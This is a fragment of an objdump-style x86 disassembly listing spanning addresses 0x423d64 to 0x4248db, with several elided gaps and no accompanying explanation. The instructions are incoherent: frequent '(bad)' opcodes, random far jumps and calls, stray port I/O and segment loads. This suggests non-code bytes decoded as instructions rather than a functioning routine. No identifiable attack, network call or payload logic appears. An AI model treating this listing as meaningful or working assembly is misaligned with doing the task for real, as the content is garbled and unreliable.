  423d64:	ficomp DWORD PTR [eax]
  423d66:	xchg   ebx,eax
  423d67:	ficom  DWORD PTR [edi]
  423d69:	adc    ebx,esp
  423d6b:	retf   
  423d6c:	and    dh,BYTE PTR [ebx-0x46b7396e]
  423d72:	or     DWORD PTR [edx+0x55],0x5770e0d8
  423d79:	pop    eax
  423d7a:	add    BYTE PTR [ebp+0x41],0x0
  423d7e:	and    al,0x7e
  423d80:	test   al,0x25
  423d82:	sbb    DWORD PTR [ecx+0x465e5bd6],edx
  423d88:	stos   DWORD PTR es:[edi],eax
  423d89:	cdq    
  423d8a:	test   BYTE PTR [ecx+0x7459a8d2],bl
  423d90:	test   ebx,esp
  423d92:	and    BYTE PTR cs:[edi-0x3dd0d62],bl
  423d99:	adc    ch,ah
  423d9b:	xchg   BYTE PTR [eax+0x35d7264c],al
  423da1:	loop   0x423dbf
  423da3:	test   DWORD PTR [ebx-0x53],edx
  423da6:	mov    ebx,0x796f867f
  423dab:	pop    ebx
  423dac:	mov    es,ebp
  423dae:	add    DWORD PTR [eax-0x27],edi
  423db1:	pop    esi
  423db2:	xchg   esi,eax
  423db3:	push   0xf4dadf1b
  423db8:	mov    DWORD PTR [esi-0x51],ebp
  423dbb:	pop    esi
  423dbc:	mov    cl,0xbd
  423dbe:	les    eax,FWORD PTR [ebx]
  423dc0:	xor    eax,0x89
	...
  423e31:	add    BYTE PTR [eax],al
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	add    ebp,esi
  423e42:	aam    0xd4
  423e44:	dec    esp
  423e45:	jg     0x423e48
  423e47:	add    dh,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    dl,dh
  423e4d:	test   cl,0x31
  423e50:	mov    ah,0xa1
  423e52:	cmp    al,0x64
  423e54:	leave  
  423e55:	sub    dl,ch
  423e57:	or     esp,DWORD PTR [edi]
  423e59:	mul    BYTE PTR [ebx]
  423e5b:	push   ebx
  423e5c:	push   ebp
  423e5d:	jmp    0x7364b66
  423e62:	lds    ebp,FWORD PTR [ecx]
  423e64:	or     DWORD PTR [eax+eiz*8+0x23],edi
  423e68:	in     al,dx
  423e69:	xchg   esp,eax
  423e6a:	gs pop es
  423e6c:	dec    ecx
  423e6d:	dec    esp
  423e6e:	push   cs
  423e6f:	es dec esp
  423e71:	inc    esi
  423e72:	mov    dl,BYTE PTR [ebx]
  423e74:	jns    0x423ecb
  423e76:	scas   al,BYTE PTR es:[edi]
  423e77:	dec    ebp
  423e78:	adc    al,0x51
  423e7a:	stos   DWORD PTR es:[edi],eax
  423e7b:	inc    ebx
  423e7c:	mov    dh,0x3a
  423e7e:	inc    ebp
  423e7f:	add    BYTE PTR [edi-0x35fefce6],0x4d
  423e86:	dec    esi
  423e87:	adc    eax,0xbc56bc52
  423e8c:	jnp    0x423ef7
  423e8e:	mov    edi,0xccafa41
  423e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e94:	inc    ebx
  423e95:	xchg   BYTE PTR cs:[ecx-0xb19b71d],bh
  423e9c:	ror    DWORD PTR [esi],0xfa
  423e9f:	je     0x423e75
  423ea1:	repnz sub ch,BYTE PTR [ebp-0xc]
  423ea5:	pushf  
  423ea6:	out    dx,eax
  423ea7:	cmp    BYTE PTR [esi-0x5dd93149],ah
  423ead:	jecxz  0x423ef0
  423eaf:	push   edx
  423eb0:	imul   ebx,ecx,0x6e
  423eb3:	repz xchg edx,eax
  423eb5:	fdivr  QWORD PTR [edx-0x6f]
  423eb8:	out    0xf,al
  423eba:	mov    dh,0x86
  423ebc:	add    al,0x3a
  423ebe:	int3   
  423ebf:	popa   
  423ec0:	js     0x423e6c
  423ec2:	gs sbb eax,0xa6bcec0b
  423ec8:	jmp    0xd84e:0xb26372ac
  423ecf:	pop    eax
  423ed0:	push   eax
  423ed1:	xchg   edi,eax
  423ed2:	mov    ebx,0xb694a127
  423ed7:	mov    cl,0xa9
  423ed9:	popa   
  423eda:	jg     0x423f42
  423edc:	mov    dh,BYTE PTR [edi]
  423ede:	ret    0x61d3
  423ee1:	jecxz  0x423f20
  423ee3:	call   0xbbfcd021
  423ee8:	mov    eax,ds:0xc9650c33
  423eed:	mov    cl,0xf9
  423eef:	xlat   BYTE PTR ds:[ebx]
  423ef0:	iret   
  423ef1:	inc    eax
  423ef2:	add    eax,0x357b9eba
  423ef7:	(bad)  
  423ef8:	sbb    ch,BYTE PTR [eax+0x2c]
  423efb:	lahf   
  423efc:	jle    0x423ecc
  423efe:	(bad)  
  423eff:	daa    
  423f00:	idiv   BYTE PTR [edi+ecx*1+0x7b]
  423f04:	and    ah,dh
  423f06:	add    ebx,DWORD PTR [edi+0x55]
  423f09:	mov    bl,0x52
  423f0b:	xchg   ecx,eax
  423f0c:	push   eax
  423f0d:	and    al,0x4e
  423f0f:	dec    edi
  423f10:	sbb    al,0xef
  423f12:	pop    ebp
  423f13:	push   edi
  423f14:	not    al
  423f16:	cmp    eax,0xbf125281
  423f1b:	mov    eax,ebp
  423f1d:	dec    edx
  423f1e:	mov    edx,0x2df460f8
  423f23:	and    eax,0xb0e1178a
  423f28:	imul   DWORD PTR [eax]
  423f2a:	adc    BYTE PTR [esp+ecx*1+0x3bf7b67c],dl
  423f31:	or     al,0xea
  423f33:	and    DWORD PTR [edx+0x4a],edi
  423f36:	stos   DWORD PTR es:[edi],eax
  423f37:	xchg   ebx,eax
  423f39:	and    al,0xdd
  423f3b:	out    dx,al
  423f3c:	out    dx,eax
  423f3d:	or     dh,dl
  423f3f:	lock mov ebp,0x95
	...
  423fb1:	add    BYTE PTR [eax],al
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x1b],dh
  423fc1:	lahf   
  423fc2:	out    dx,eax
  423fc3:	fadd   DWORD PTR [edx-0x80]
  423fc6:	add    DWORD PTR [eax],eax
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    BYTE PTR [ebx+0x6b3e0e35],ah
  423fd1:	jbe    0x423fe0
  423fd3:	icebp  
  423fd4:	push   ss
  423fd5:	and    al,0xe0
  423fd7:	push   dx
  423fd9:	push   esp
  423fda:	out    0xa,al
  423fdc:	and    BYTE PTR [esi],ah
  423fde:	and    eax,0x491d9463
  423fe3:	(bad)  
  423fe4:	xor    DWORD PTR [ebx+eiz*1+0x3a31ade2],edi
  423feb:	outs   dx,BYTE PTR ds:[esi]
  423fec:	outs   dx,BYTE PTR ds:[esi]
  423fed:	scas   al,BYTE PTR es:[edi]
  423fee:	push   es
  423fef:	and    DWORD PTR [ecx+0x12],0xbc1a2d81
  423ff6:	xchg   BYTE PTR [esi-0x38b43714],dl
  423ffc:	and    dh,BYTE PTR [esi-0x2e]
  423fff:	rol    BYTE PTR [ebx+0x4ac4ed57],cl
  424005:	xchg   esi,ecx
  424007:	clc    
  424008:	xchg   edi,eax
  424009:	pop    eax
  42400a:	push   ebx
  42400b:	add    ecx,edi
  42400d:	jae    0x42400f
  42400f:	(bad)  
  424010:	sar    BYTE PTR [edi+edx*4],0x64
  424014:	xchg   ecx,edx
  424016:	cmp    eax,0xf575240b
  42401b:	stc    
  42401c:	test   eax,0x15534eda
  424021:	mov    ds:0xccfa958d,eax
  424026:	inc    eax
  424027:	ja     0x4240a6
  424029:	jmp    0x91c09380
  42402e:	popf   
  42402f:	cmp    DWORD PTR [ebx+esi*1],0xdb5e57e6
  424036:	xchg   ecx,eax
  424037:	xor    bl,bl
  424039:	sti    
  42403a:	cmp    eax,0x73486cef
  42403f:	or     eax,0x641b3772
  424044:	sahf   
  424045:	inc    edi
  424046:	push   0xdc91893a
  42404b:	mov    ss,WORD PTR [esp+eiz*4+0x1c01c23a]
  424052:	sbb    DWORD PTR [ebx-0x6130db40],edx
  424058:	jle    0x4240c1
  42405a:	sbb    eax,0x36c87fb
  42405f:	mov    edi,DWORD PTR [edi+0x4741b754]
  424065:	mov    eax,0x961ae116
  42406a:	cmp    ebp,0x4b6f3c5a
  424070:	test   BYTE PTR [ecx-0x56],dl
  424073:	inc    edx
  424074:	call   0x26b59915
  424079:	sar    BYTE PTR [esi+0x53],0x4b
  42407d:	pop    esp
  42407e:	sti    
  42407f:	pop    ecx
  424080:	xchg   esp,esi
  424082:	adc    DWORD PTR [esp+eax*8],0x5
  424086:	shl    esp,1
  424088:	loope  0x4240cc
  42408a:	adc    al,0xc5
  42408c:	push   cs
  42408d:	sbb    ebp,edi
  42408f:	lds    ecx,FWORD PTR [esp+eiz*8-0x50]
  424093:	aas    
  424094:	fisubr DWORD PTR [esi]
  424096:	ror    BYTE PTR [edx-0x4110f1f8],cl
  42409c:	push   edi
  42409d:	dec    ebp
  42409e:	stos   DWORD PTR es:[edi],eax
  42409f:	cmp    ebp,DWORD PTR [ecx+ebx*2+0x4e9ad433]
  4240a6:	addr16 xchg esi,eax
  4240a8:	loop   0x4240a6
  4240aa:	xor    ax,0x3202
  4240ae:	rol    BYTE PTR [ebx-0x65794b35],1
  4240b4:	jecxz  0x4240cd
  4240b6:	add    eax,0x2e63c83a
  4240bb:	inc    ebx
  4240bc:	xchg   ebx,eax
  4240bd:	popa   
  4240be:	jecxz  0x4240a2
  4240c0:	cli    
  4240c1:	call   0x0:0x0
	...
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax+0x540d7b6a]
  424142:	xor    al,0x44
  424144:	cmp    BYTE PTR [ecx+0xf60001],al
  42414a:	add    BYTE PTR [eax],al
  42414c:	popa   
  42414d:	inc    edx
  42414e:	sar    DWORD PTR [ebp-0x1d4787c0],0x1b
  424155:	lock jp 0x424117
  424158:	jecxz  0x4240e4
  42415a:	mov    al,0xce
  42415c:	xor    eax,0xc4feda42
  424161:	sub    al,0x70
  424163:	enter  0x843c,0x86
  424167:	idiv   BYTE PTR [eax+0x32]
  42416a:	imul   DWORD PTR [esi-0x7f]
  42416d:	cmp    ebp,DWORD PTR [eax+esi*8+0x34d8eee7]
  424174:	add    dh,BYTE PTR [esi+0x23]
  424177:	imul   eax,DWORD PTR [eax+0xe6eff6e],0x167fa857
  424181:	cdq    
  424182:	fwait
  424183:	push   es
  424184:	xchg   DWORD PTR [edi+0x4],eax
  424187:	aaa    
  424188:	int3   
  424189:	mov    bl,0x16
  42418b:	fbld   TBYTE PTR [edi-0x38]
  42418e:	sbb    ebp,DWORD PTR [ebx+0x20]
  424191:	pop    ss
  424192:	sbb    eax,0xf5b39512
  424197:	inc    esp
  424198:	sub    al,0xaf
  42419a:	or     dl,BYTE PTR [ecx+0x5a122dbe]
  4241a0:	gs xchg esp,eax
  4241a2:	mov    ch,0x8c
  4241a4:	sar    DWORD PTR [edx+0x75],1
  4241a7:	xchg   ebp,eax
  4241a8:	loope  0x42420e
  4241aa:	enter  0x74c5,0x64
  4241ae:	add    esp,edi
  4241b0:	fistp  DWORD PTR [ebp+0x4fb8efcc]
  4241b6:	test   eax,0x3bc2d79c
  4241bb:	aas    
  4241bc:	popf   
  4241bd:	pop    eax
  4241be:	cmp    ebp,esi
  4241c0:	loope  0x42420c
  4241c2:	pop    edi
  4241c3:	adc    ebp,DWORD PTR [edi-0x9]
  4241c6:	sub    bl,BYTE PTR [ecx+0x19ff41c1]
  4241cc:	mov    dh,0x2f
  4241ce:	xor    bl,BYTE PTR [eax+0x626bfde5]
  4241d4:	ja     0x424197
  4241d6:	ds inc ebx
  4241d8:	pop    edx
  4241d9:	out    dx,al
  4241da:	pop    ecx
  4241db:	outs   dx,BYTE PTR ds:[esi]
  4241dc:	cmp    BYTE PTR [ecx-0x3b],ah
  4241df:	jge    0x42419c
  4241e1:	sbb    DWORD PTR [esi-0x2be4c7b4],esi
  4241e7:	popa   
  4241e8:	shr    ebp,1
  4241ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241eb:	dec    ebx
  4241ec:	or     edx,ebp
  4241ee:	mov    dl,0x36
  4241f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241f1:	xchg   esi,eax
  4241f2:	lahf   
  4241f3:	xchg   BYTE PTR [ecx-0x6820eefa],dh
  4241f9:	in     al,dx
  4241fa:	shl    DWORD PTR [ebp+ebx*1+0x24c1fd53],cl
  424201:	push   edx
  424202:	retf   
  424203:	inc    edx
  424204:	inc    esp
  424205:	sub    ebp,edi
  424207:	outs   dx,DWORD PTR ds:[esi]
  424208:	je     0x424236
  42420a:	aad    0xb1
  42420c:	icebp  
  42420d:	fdivr  DWORD PTR [ebx-0x54]
  424210:	cmp    al,0x67
  424212:	adc    ch,BYTE PTR [ebx+ebx*8+0x53a886a8]
  424219:	xchg   esp,eax
  42421a:	ins    BYTE PTR es:[edi],dx
  42421b:	sub    dl,BYTE PTR [ebx-0x692403e8]
  424221:	and    BYTE PTR [esi],al
  424223:	ds pop ebx
  424226:	adc    eax,0xdf4eb646
  42422b:	mov    esp,0x8ac3498f
  424230:	mov    ds:0x1c579d8a,al
  424235:	xchg   BYTE PTR [edi+0x35],al
  424238:	add    eax,DWORD PTR [ecx+ecx*1-0xe]
  42423c:	les    edi,FWORD PTR [ebx]
  42423e:	xchg   ecx,eax
  42423f:	cmc    
  424240:	sahf   
  424241:	mov    al,0x0
	...
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x5cb9a4bf,eax
  4242c2:	sub    ah,ch
  4242c4:	add    BYTE PTR cs:[ecx],0x0
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    BYTE PTR [edx+0x27],cl
  4242ce:	add    eax,0xbd2f130c
  4242d3:	dec    edi
  4242d4:	inc    ecx
  4242d5:	loop   0x424337
  4242d7:	popf   
  4242d8:	or     BYTE PTR [ecx],bh
  4242da:	inc    eax
  4242db:	lahf   
  4242dc:	pop    edi
  4242dd:	ins    BYTE PTR es:[edi],dx
  4242de:	fs std 
  4242e0:	loope  0x424293
  4242e2:	popf   
  4242e3:	pop    ecx
  4242e4:	jns    0x42427a
  4242e6:	cmp    al,0x13
  4242e8:	mov    cl,0x30
  4242ea:	jne    0x424326
  4242ec:	add    bl,dh
  4242ee:	and    eax,0x64ef1bf3
  4242f3:	aaa    
  4242f4:	(bad)  
  4242f5:	loope  0x424347
  4242f7:	ret    
  4242f8:	loope  0x42427d
  4242fa:	fisub  WORD PTR [edi-0x4]
  4242fd:	leave  
  4242fe:	fbstp  TBYTE PTR [edx]
  424300:	in     eax,0x48
  424302:	mov    esi,0x11aeb9d3
  424307:	adc    ebx,DWORD PTR [esi+0x63c07703]
  42430d:	dec    edx
  42430e:	jbe    0x42432e
  424310:	mov    ah,0x58
  424312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424313:	aad    0x59
  424315:	adc    bl,BYTE PTR [edx]
  424317:	inc    eax
  424318:	xrelease xchg BYTE PTR [edi+0x230ee28c],dl
  42431f:	push   ebx
  424320:	add    ah,BYTE PTR [edi]
  424322:	loop   0x424320
  424324:	inc    edi
  424325:	add    al,ch
  424327:	rcl    BYTE PTR [edi],1
  424329:	and    ch,cl
  42432b:	jae    0x4242c7
  42432d:	push   ecx
  42432e:	enter  0x8122,0x2a
  424332:	mov    ch,0x14
  424334:	pusha  
  424335:	cmp    DWORD PTR [edx-0x4a2a9e74],ecx
  42433b:	shl    al,0x0
  42433e:	xchg   esi,eax
  42433f:	jp     0x424334
  424341:	xor    eax,0x5e2da724
  424346:	(bad)  
  424348:	scas   eax,DWORD PTR es:[edi]
  424349:	shl    DWORD PTR fs:[eax],0xe7
  42434d:	outs   dx,DWORD PTR ds:[esi]
  42434e:	into   
  42434f:	test   DWORD PTR [edi+0x2d],ebp
  424352:	xlat   BYTE PTR ds:[ebx]
  424353:	mov    eax,ds:0xd27be0fc
  424358:	imul   BYTE PTR [ecx+0x88a8016]
  42435e:	add    ecx,edi
  424360:	in     eax,0xa6
  424362:	retf   
  424363:	neg    ebp
  424365:	mov    ds:0x505983ea,al
  42436a:	sbb    eax,0x910ec462
  42436f:	in     al,0x93
  424371:	pushf  
  424372:	push   eax
  424373:	push   edi
  424374:	imul   edx,DWORD PTR [eax],0x9a3af65d
  42437a:	push   0x527fcf66
  42437f:	rcl    BYTE PTR [ebx+0x7d76c6bd],cl
  424385:	adc    al,0xce
  424387:	loopne 0x42437d
  424389:	(bad)  
  42438a:	scas   eax,DWORD PTR es:[edi]
  42438b:	fsubr  st,st(4)
  42438d:	mov    dl,0xa4
  42438f:	outs   dx,BYTE PTR ds:[esi]
  424390:	call   0x25888497
  424395:	mov    al,0x4d
  424397:	stos   BYTE PTR es:[edi],al
  424398:	add    BYTE PTR [edx-0x38],bh
  42439b:	xor    eax,0xf605eb1c
  4243a0:	cli    
  4243a1:	add    bl,BYTE PTR [eax]
  4243a3:	test   al,0x7d
  4243a5:	cmp    BYTE PTR [ebx+0x34],bl
  4243a8:	dec    edx
  4243a9:	ins    DWORD PTR es:[edi],dx
  4243aa:	data16 sar BYTE PTR [edx],0xd
  4243ae:	loope  0x424408
  4243b0:	data16 xor dh,BYTE PTR [eax-0x68ca63ab]
  4243b7:	iret   
  4243b8:	das    
  4243b9:	int3   
  4243ba:	cli    
  4243bb:	mov    al,ds:0xbf1a46a7
  4243c0:	jg     0x4243b1
	...
  424432:	add    BYTE PTR [eax],al
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	and    BYTE PTR [edx-0x7a],dh
  424443:	dec    esp
  424444:	and    al,0x83
  424446:	add    DWORD PTR [eax],eax
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    BYTE PTR [ebp+0x421d793a],al
  424451:	dec    ecx
  424452:	inc    edi
  424453:	mov    edi,0xad8e0816
  424458:	fnstsw WORD PTR [eax+0x38]
  42445b:	jge    0x4243e6
  42445d:	mov    ss,WORD PTR [eax+0x736c81fe]
  424463:	push   cs
  424464:	std    
  424465:	ret    0x102
  424468:	xor    eax,0xb1c4d256
  42446d:	xchg   ebx,eax
  42446e:	test   eax,0x6a1067e7
  424473:	xor    BYTE PTR [eax-0x5a94759],cl
  424479:	mov    ebx,esp
  42447b:	add    DWORD PTR [edi+0x45d95bad],0xa6e61f
  424485:	pop    ebp
  424486:	cli    
  424487:	pop    eax
  424488:	mov    ah,0x9c
  42448a:	mov    ah,0x35
  42448c:	push   ds
  42448d:	sahf   
  42448e:	push   edx
  42448f:	dec    ebp
  424490:	test   BYTE PTR [esi],dh
  424492:	cmp    DWORD PTR [esi+0x46496fe2],edx
  424498:	and    ebx,DWORD PTR [ebp-0x8]
  42449b:	sbb    al,0x38
  42449d:	scas   eax,DWORD PTR es:[edi]
  42449e:	jmp    0x42449f
  4244a0:	sbb    cl,BYTE PTR [edx]
  4244a2:	les    ebx,FWORD PTR [ebx+0x5d]
  4244a5:	mov    gs,WORD PTR [edi]
  4244a7:	sbb    DWORD PTR ds:0x4954a7ec,edx
  4244ad:	jns    0x42449b
  4244af:	sub    ebp,ebx
  4244b1:	out    dx,al
  4244b2:	xchg   esi,eax
  4244b3:	dec    esp
  4244b4:	popf   
  4244b5:	cmp    ah,BYTE PTR [ebx-0x4e]
  4244b8:	push   ecx
  4244b9:	in     eax,dx
  4244ba:	xchg   DWORD PTR [eax+eiz*8+0x1cfd0601],esi
  4244c1:	call   0x3d67:0xe6e3924a
  4244c8:	ret    0x1cea
  4244cb:	and    ebx,DWORD PTR [edx+0x74]
  4244ce:	push   ecx
  4244cf:	int3   
  4244d0:	cdq    
  4244d1:	adc    eax,0x46a22492
  4244d6:	add    al,BYTE PTR [esi-0x59]
  4244d9:	imul   ebp,ebx,0x3e
  4244dc:	mov    al,ds:0x8795ca7c
  4244e1:	ror    DWORD PTR [eax-0x23],cl
  4244e4:	imul   ebx,ecx,0x4240132
  4244ea:	adc    al,BYTE PTR [esi-0x12a3c4c2]
  4244f0:	lods   eax,DWORD PTR ds:[esi]
  4244f1:	push   cs
  4244f2:	outs   dx,BYTE PTR ds:[esi]
  4244f3:	push   cs
  4244f4:	cmp    eax,0x5a088271
  4244f9:	fs jp  0x4244ab
  4244fc:	(bad)  
  4244fd:	sbb    al,BYTE PTR [edx+edx*4-0x3999576e]
  424504:	mov    bl,0x52
  424506:	xor    BYTE PTR [ebx+0x3d],bl
  424509:	and    DWORD PTR [esi],esi
  42450b:	fsubr  st,st(0)
  42450d:	push   esp
  42450e:	mov    ss,WORD PTR [ecx]
  424510:	mov    al,ds:0xf102bffb
  424515:	sbb    eax,0x7dd69f33
  42451a:	and    eax,0xbd391e3f
  42451f:	cdq    
  424520:	(bad)  
  424521:	out    0x2,eax
  424523:	lahf   
  424524:	fldenv [di-0x776]
  424529:	mov    ebp,0xc7b8ead3
  42452e:	(bad)  
  42452f:	leave  
  424530:	lock or BYTE PTR [edx-0x3389dba3],0x50
  424538:	add    bl,ch
  42453a:	repz loop 0x4244c1
  42453d:	sbb    eax,0x6b8d2c62
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    DWORD PTR [edi+0x1a1ec120],esp
  4245c5:	test   BYTE PTR [ecx],al
  4245c7:	add    dh,dh
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [eax],ch
  4245cd:	xor    eax,0x7be8cb81
  4245d2:	push   ebx
  4245d3:	add    ch,BYTE PTR [edi+0x7138b630]
  4245d9:	out    dx,eax
  4245da:	mov    DWORD PTR [eax],esi
  4245dc:	mov    ds:0x256739ef,al
  4245e1:	iret   
  4245e2:	fsubr  DWORD PTR [eax+0x1d]
  4245e5:	mov    bh,0xb2
  4245e7:	inc    ebx
  4245e8:	(bad)  
  4245e9:	xchg   ecx,eax
  4245ea:	cmp    esp,edx
  4245ec:	frstor [eax]
  4245ee:	sub    dl,bl
  4245f0:	mov    al,0x2
  4245f2:	ret    0x342d
  4245f5:	push   0x56683169
  4245fa:	mov    al,ds:0x473c5c97
  4245ff:	icebp  
  424600:	inc    ecx
  424601:	push   es
  424602:	mov    eax,ds:0x29384357
  424607:	xchg   edx,eax
  424608:	dec    esi
  424609:	xor    al,0xce
  42460b:	hlt    
  42460c:	pop    ebx
  42460d:	push   ds
  42460e:	scas   eax,DWORD PTR es:[edi]
  42460f:	dec    eax
  424610:	les    ebp,FWORD PTR [edx-0x6c]
  424613:	mov    WORD PTR [edx+0x456e5b8a],ss
  424619:	icebp  
  42461a:	inc    ebp
  42461b:	ret    
  42461c:	push   eax
  42461d:	xor    edi,esp
  42461f:	sbb    DWORD PTR [edx],eax
  424621:	fmulp  st(7),st
  424623:	ds jo  0x4245e1
  424626:	xchg   edi,eax
  424627:	pop    edi
  424628:	jmp    0x424679
  42462a:	pop    ebx
  42462b:	mov    al,ds:0x682d33b1
  424630:	je     0x424618
  424632:	cmp    edi,esp
  424634:	jmp    0x4245ee
  424636:	into   
  424637:	fiadd  WORD PTR [ebp+0x38bb6266]
  42463d:	rcl    DWORD PTR [esi],cl
  42463f:	fwait
  424640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424641:	xor    al,0x38
  424643:	adc    al,0x7d
  424645:	inc    esi
  424646:	test   eax,0x1e91b311
  42464b:	pop    DWORD PTR [ecx-0x39ba1950]
  424651:	adc    DWORD PTR [ebx+0x7c],ebx
  424654:	mov    BYTE PTR ds:0xb8f5d09d,ah
  42465a:	cmp    BYTE PTR [esi],ch
  42465c:	and    BYTE PTR [ecx+0x322e7697],al
  424662:	ret    
  424663:	mul    bh
  424665:	or     DWORD PTR [edi-0x7545100],esp
  42466b:	int3   
  42466c:	cmp    eax,0x33ee29fd
  424671:	mov    eax,0x97ba3c5e
  424676:	push   ecx
  424677:	or     al,0xfa
  424679:	or     BYTE PTR [ebx],ch
  42467b:	retf   
  42467c:	mov    ebp,DWORD PTR [ebx+0x4c]
  42467f:	push   0x3a47f47
  424684:	lock xor ch,cl
  424687:	test   eax,ecx
  424689:	add    ebp,DWORD PTR [eax+esi*8-0x5e]
  42468d:	xchg   esi,eax
  42468e:	aas    
  42468f:	mov    bl,0xce
  424691:	das    
  424692:	leave  
  424693:	mov    bh,0xc1
  424695:	and    al,dh
  424697:	jb     0x4246ff
  424699:	jmp    0xf557:0x9580ff0d
  4246a0:	inc    esi
  4246a1:	inc    ecx
  4246a2:	(bad)  
  4246a3:	push   ebx
  4246a4:	outs   dx,BYTE PTR ds:[esi]
  4246a5:	mov    ?,WORD PTR [eax+0x49d8546]
  4246ab:	push   es
  4246ac:	fidiv  WORD PTR [eax]
  4246ae:	cmc    
  4246af:	scas   eax,DWORD PTR es:[edi]
  4246b0:	out    dx,al
  4246b1:	mov    WORD PTR [esi-0xe648834],fs
  4246b7:	je     0x42467c
  4246b9:	and    esp,esp
  4246bb:	repnz dec ecx
  4246bd:	addr16 icebp 
  4246bf:	cmp    ebx,ebx
  4246c1:	cmp    al,BYTE PTR [eax]
	...
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fucom  st(1)
  424741:	ret    
  424742:	arpl   WORD PTR [edx],si
  424744:	adc    BYTE PTR [ebp+0xf60001],al
  42474a:	add    BYTE PTR [eax],al
  42474c:	push   edi
  42474d:	out    dx,al
  42474e:	test   al,0x63
  424750:	and    DWORD PTR [ebx+0x1d],eax
  424753:	repz sbb esi,ebp
  424756:	add    eax,DWORD PTR [ebp+esi*1-0x1f53d9d4]
  42475d:	sub    dl,BYTE PTR [ebx+0x4f708008]
  424763:	into   
  424764:	mulps  xmm5,XMMWORD PTR [ecx+ebx*1+0xe6c1931]
  42476c:	sbb    eax,0x62fe8f76
  424771:	cmp    DWORD PTR [edx-0x4580731d],eax
  424777:	fcom   QWORD PTR [eax]
  424779:	popf   
  42477a:	retf   
  42477b:	ret    0x4f4b
  42477e:	out    dx,al
  42477f:	(bad)  
  424780:	fmulp  st(7),st
  424782:	xor    dh,ah
  424784:	shl    dh,0xe8
  424787:	out    dx,eax
  424788:	arpl   dx,ax
  42478a:	loopne 0x4247b9
  42478c:	sub    al,0xdc
  42478e:	repz mov dh,ah
  424791:	lods   al,BYTE PTR ds:[esi]
  424792:	test   eax,0x804c5ecd
  424797:	cmp    eax,0xac8d6414
  42479c:	in     eax,0xf9
  42479e:	add    ebx,DWORD PTR [esi-0x9]
  4247a1:	retf   0xa018
  4247a4:	jns    0x42481c
  4247a6:	cmc    
  4247a7:	les    edx,FWORD PTR [ebx+0x25f7bb00]
  4247ad:	lahf   
  4247ae:	jmp    0x424b:0xb60e3c5
  4247b5:	push   0x70c6e3a
  4247ba:	or     BYTE PTR [ecx],0x7f
  4247bd:	pop    esi
  4247be:	or     edi,DWORD PTR [edi]
  4247c0:	sar    BYTE PTR [ebx+0x604fe8af],0x9f
  4247c7:	xchg   edx,eax
  4247c8:	lods   al,BYTE PTR ds:[esi]
  4247c9:	dec    eax
  4247ca:	xchg   edx,eax
  4247cb:	mov    edi,0x110c9a41
  4247d0:	cli    
  4247d1:	push   0xee532c90
  4247d6:	jno    0x424796
  4247d8:	jmp    0x6fe65947
  4247dd:	fwait
  4247de:	stos   BYTE PTR es:[edi],al
  4247df:	xchg   esp,eax
  4247e0:	xlat   BYTE PTR ds:[ebx]
  4247e1:	mov    bl,0xa3
  4247e3:	nop
  4247e4:	ins    DWORD PTR es:[edi],dx
  4247e5:	sub    ch,BYTE PTR [ecx+0x3789de9f]
  4247eb:	adc    al,0x99
  4247ed:	cwde   
  4247ee:	jge    0x4247c4
  4247f0:	mov    esp,0x8eba995e
  4247f5:	or     esp,ebx
  4247f7:	aam    0x9b
  4247f9:	out    0x61,al
  4247fb:	dec    edx
  4247fc:	push   cs
  4247fd:	or     eax,0xcd819c44
  424802:	sbb    DWORD PTR [eax-0x79e59243],0x611d7a52
  42480c:	or     BYTE PTR [ecx-0x47c020ce],ah
  424812:	(bad)  
  424813:	aad    0x81
  424815:	int3   
  424816:	scas   eax,DWORD PTR es:[edi]
  424817:	mov    esp,edx
  424819:	cmp    DWORD PTR [edi+0x110a4dcb],0x6481876d
  424823:	add    al,0xa5
  424825:	xor    BYTE PTR [edi+ebx*1+0x79],bl
  424829:	and    al,0x24
  42482b:	jno    0x424802
  42482d:	test   al,0x45
  42482f:	ds in  al,0x24
  424832:	mov    edx,0x1239a661
  424837:	in     eax,0x3b
  424839:	dec    ebx
  42483a:	or     ch,ah
  42483c:	arpl   WORD PTR [edx],ax
  42483e:	rcl    DWORD PTR [ebx+0x1ce2],cl
	...
  4248b4:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424940
  4248c1:	push   edi
  4248c2:	cli    
  4248c3:	inc    esi
  4248c4:	push   es
  4248c5:	xchg   BYTE PTR [ecx],al
  4248c7:	add    dh,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [ebp-0x5493591d],bl
  4248d1:	es jl  0x4248aa
  4248d4:	xor    eax,0xefbdd040
  4248d9:	inc    esp
  4248da:	int3   
  4248db:	and    esi,edi
